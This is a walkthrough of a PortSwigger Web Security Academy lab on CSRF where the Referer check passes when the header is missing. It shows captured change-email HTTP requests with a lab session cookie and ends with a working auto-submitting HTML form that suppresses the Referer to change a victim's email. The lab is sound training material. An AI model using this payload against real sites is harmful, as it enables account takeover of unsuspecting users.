# Lab: CSRF where Referer validation depends on header being present
# https://portswigger.net/web-security/learning-paths/csrf/csrf-validation-of-referer-depends-on-header-being-present/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present#

```bash
# Change your email to a@gmail.com and check change-email from burp.

POST /my-account/change-email HTTP/2
Host: 0adf00310468f8a28098bc0900b300b4.web-security-academy.net
Cookie: session=U9gdXUZHIymMXzamzFEL4J7bQXiSNAMa
Referer: https://0adf00310468f8a28098bc0900b300b4.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: https://0adf00310468f8a28098bc0900b300b4.web-security-academy.net

email=a%40gmail.com

```

```bash
# Send the request to the repeater.
# If you change the domain in the Referer HTTP header then the request is rejected. 

POST /my-account/change-email HTTP/2
Host: 0adf00310468f8a28098bc0900b300b4.web-security-academy.net
Cookie: session=U9gdXUZHIymMXzamzFEL4J7bQXiSNAMa

email=abcdefg%40gmail.com

#  Delete the Referer header entirely and observe that the request is now accepted. 

```

```bash
# Create payload and deliver to victim.

<html>
<head>
<meta name="referrer" content="no-referrer">
</head>
<body>
<form method="POST" action="https://0adf00310468f8a28098bc0900b300b4.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="var@gmail.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
